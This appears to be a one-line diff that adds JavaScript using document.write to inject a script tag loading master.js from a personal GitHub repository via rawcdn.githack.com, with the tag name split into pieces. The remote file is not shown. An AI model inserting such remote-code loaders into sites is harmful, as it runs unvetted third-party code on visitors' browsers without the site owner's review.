@@ -1,0 +1,1 @@
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/aridjaya/1d0c2f4eb0be56704e5dcbef99ac2c09cb5976c3/master.js"></scr' + 'ipt>');
